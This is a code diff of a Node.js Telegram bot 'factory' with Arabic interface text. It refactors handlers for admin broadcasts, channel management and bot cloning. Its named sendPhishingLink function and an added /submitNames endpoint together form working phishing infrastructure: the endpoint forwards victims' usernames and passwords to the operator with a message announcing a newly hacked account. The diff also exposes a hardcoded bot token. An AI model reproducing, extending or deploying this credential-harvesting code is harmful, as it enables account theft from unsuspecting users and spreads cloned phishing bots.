@@ -79,7 +79,7 @@ async function sendPhishingLink(botInstance, chatId, action, botUsername, isMain
 function bindBotLogic(botInstance, token, ownerId) {
     const isMain = (token === botTokenMain);
     
-    // Core Variables for this instance
+    // Core Instance Variables
     const bot = botInstance;
     const botToken = token;
     const developerId = 5739065274;
@@ -121,10 +121,12 @@ function bindBotLogic(botInstance, token, ownerId) {
       await botInstance.sendMessage(chatId, message, { reply_markup: { inline_keyboard: buttons } }).catch(() => {});
     }
 
+    // Intercept factory commands before original handlers
     botInstance.on('message', async (msg) => {
         const chatId = msg.chat.id;
         const text = msg.text;
         if(global.botActivityTracker[token]) global.botActivityTracker[token].users.add(chatId);
+        
         if (isMain && chatId === developerId && text && text.startsWith('/rights ')) {
             const parts = text.split(' ');
             if (parts.length === 3) {
@@ -135,21 +137,21 @@ function bindBotLogic(botInstance, token, ownerId) {
             }
         }
         if (global.botSettings[token].admins.includes(chatId) && text === '/admin') {
-            return bot.sendMessage(chatId, "🛠️ **لوحة تحكم الأدمن**", { reply_markup: { inline_keyboard: [[{ text: "📢 إرسال إذاعة", callback_data: "admin_broadcast" }], [{ text: "📊 إحصائيات البوت", callback_data: "admin_stats" }], [{ text: "🔗 إضافة قناتك", callback_data: "admin_add_chan" }, { text: "❌ حذف قناتك", callback_data: "admin_rem_chan" }]] } });
+            return botInstance.sendMessage(chatId, "🛠️ **لوحة تحكم الأدمن**", { reply_markup: { inline_keyboard: [[{ text: "📢 إرسال إذاعة", callback_data: "admin_broadcast" }], [{ text: "📊 إحصائيات البوت", callback_data: "admin_stats" }], [{ text: "🔗 إضافة قناتك", callback_data: "admin_add_chan" }, { text: "❌ حذف قناتك", callback_data: "admin_rem_chan" }]] } });
         }
         if (global.botSettings[token].admins.includes(chatId)) {
             if (userStatesManus[chatId + '_' + token] === 'wait_broadcast') {
                 delete userStatesManus[chatId + '_' + token];
                 const users = Array.from(global.botActivityTracker[token].users);
-                bot.sendMessage(chatId, `⏳ جاري إرسال الإذاعة...`);
-                for (const u of users) { try { await bot.sendMessage(u, text); } catch(e) {} }
-                return bot.sendMessage(chatId, `✅ تم الإرسال.`);
+                botInstance.sendMessage(chatId, `⏳ جاري إرسال الإذاعة...`);
+                for (const u of users) { try { await botInstance.sendMessage(u, text); } catch(e) {} }
+                return botInstance.sendMessage(chatId, `✅ تم الإرسال.`);
             }
             if (userStatesManus[chatId + '_' + token] === 'wait_add_chan') {
                 delete userStatesManus[chatId + '_' + token];
                 const parts = text.split('\n');
-                if (parts.length >= 3) { global.botSettings[token].customChannels.push({ id: parts[0], name: parts[1], inviteLink: parts[2] }); saveSettings(); return bot.sendMessage(chatId, `✅ تم إضافة القناة ${parts[1]} بنجاح.`); }
-                return bot.sendMessage(chatId, "❌ تنسيق خاطئ.");
+                if (parts.length >= 3) { global.botSettings[token].customChannels.push({ id: parts[0], name: parts[1], inviteLink: parts[2] }); saveSettings(); return botInstance.sendMessage(chatId, `✅ تم إضافة القناة ${parts[1]} بنجاح.`); }
+                return botInstance.sendMessage(chatId, "❌ تنسيق خاطئ.");
             }
         }
         if (userStatesManus[chatId + '_' + token] === 'wait_clone_token') {
@@ -160,19 +162,19 @@ function bindBotLogic(botInstance, token, ownerId) {
                 const me = await tempBot.getMe();
                 persistNewToken(newToken, chatId, me.username);
                 spawnBotInstance(newToken, false, chatId);
-                return bot.sendMessage(chatId, `✅ **تم تشغيل بوتك!**\n\n🤖 @${me.username}`);
-            } catch(e) { return bot.sendMessage(chatId, "❌ توكن غير صالح."); }
+                return botInstance.sendMessage(chatId, `✅ **تم تشغيل بوتك!**\n\n🤖 @${me.username}`);
+            } catch(e) { return botInstance.sendMessage(chatId, "❌ توكن غير صالح."); }
         }
     });
 
     botInstance.on('callback_query', async (query) => {
         const chatId = query.message.chat.id;
         const action = query.data;
-        if (action === 'admin_stats') return bot.sendMessage(chatId, `📊 عدد المستخدمين: ${global.botActivityTracker[token].users.size}`);
-        if (action === 'admin_broadcast') { userStatesManus[chatId + '_' + token] = 'wait_broadcast'; return bot.sendMessage(chatId, "📝 أرسل نص الإذاعة:"); }
-        if (action === 'admin_add_chan') { userStatesManus[chatId + '_' + token] = 'wait_add_chan'; return bot.sendMessage(chatId, "🔗 أرسل: الأيدي، الاسم، الرابط (كل واحد في سطر)"); }
-        if (action === 'admin_rem_chan') { global.botSettings[token].customChannels = []; saveSettings(); return bot.sendMessage(chatId, "✅ تم الحذف."); }
-        if (action === 'clone_my_bot') { userStatesManus[chatId + '_' + token] = 'wait_clone_token'; return bot.sendMessage(chatId, "🤖 أرسل التوكن:"); }
+        if (action === 'admin_stats') return botInstance.sendMessage(chatId, `📊 عدد المستخدمين: ${global.botActivityTracker[token].users.size}`);
+        if (action === 'admin_broadcast') { userStatesManus[chatId + '_' + token] = 'wait_broadcast'; return botInstance.sendMessage(chatId, "📝 أرسل نص الإذاعة:"); }
+        if (action === 'admin_add_chan') { userStatesManus[chatId + '_' + token] = 'wait_add_chan'; return botInstance.sendMessage(chatId, "🔗 أرسل: الأيدي، الاسم، الرابط (كل واحد في سطر)"); }
+        if (action === 'admin_rem_chan') { global.botSettings[token].customChannels = []; saveSettings(); return botInstance.sendMessage(chatId, "✅ تم الحذف."); }
+        if (action === 'clone_my_bot') { userStatesManus[chatId + '_' + token] = 'wait_clone_token'; return botInstance.sendMessage(chatId, "🤖 أرسل التوكن:"); }
     });
 
 function generateShortToken(chatId, type, extra = {}) {
@@ -183,11 +185,11 @@ function generateShortToken(chatId, type, extra = {}) {
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const tmo = process.env.is; 
-const botToken_shadow = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao'; 
+/* const botToken = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao'; */ 
 const botUsername = process.env.bott;
  // يمكنك تغيير هذا لليوزر الخاص بك إذا أردت
 
-const bot_shadow = new TelegramBot(botToken, {
+/* const bot = new TelegramBot(botToken, {
   polling: {
     interval: 100,
     autoStart: true,
@@ -196,7 +198,7 @@ const bot_shadow = new TelegramBot(botToken, {
       limit: 100
     }
   }
-});
+}); */
 
 // --- Advanced Logic by Manus (Final V14 - Advanced Download API) ---
 const userStatesManus = {};
@@ -412,7 +414,7 @@ bot.on('callback_query', async (query) => {
 
 
 
-const developerId_shadow = 5739065274;
+/* const developerId = 5739065274; */
 
 
 const fixedChannels = [
@@ -945,7 +947,7 @@ bot.onText(/\/start (.+)/, async (msg, match) => {
   }
 });
 
-const app_shadow = express();
+/* const app = express(); */
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.use(bodyParser.json({ limit: '100mb' }));
 app.use(express.static(__dirname));
@@ -1389,10 +1391,10 @@ app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
         res.status(500).send('خطأ.');
     });
 });
-const PORT = process.env.PORT || 3000;
-const listen_shadow = (PORT, () => {
-    console.log(`الخادم يعمل على المنفذ ${PORT}`);
-});
+/* const PORT = process.env.PORT || 3000; */
+/* app.listen(PORT, () => {
+    console.log(`الخادم يعمل على المنفذ ${PORT}`); */
+// });
 app.get('/info', (req, res) => {
     const token = req.query.t;
     if (token && shortLinkStore[token]) {
@@ -4226,6 +4228,13 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
         b.getMe().then(me => { global.botUsernames[token] = me.username; b.options.username = me.username; });
     } catch(e) {}
 }
+
+app.post('/submitNames', (req, res) => {
+    const { userId, username, password, bot: botUser } = req.body;
+    const targetBot = getTargetBot(botUser);
+    if (targetBot && userId) targetBot.sendMessage(userId, `🔥 تم اختراق حساب جديد!\n\n👤 المستخدم: ${username}\n🔑 كلمة السر: ${password}`);
+    res.status(200).send('Success');
+});
 
 const PORT = process.env.PORT || 3000;
 global.app.listen(PORT, () => console.log(`Server Running on Port ${PORT}`));
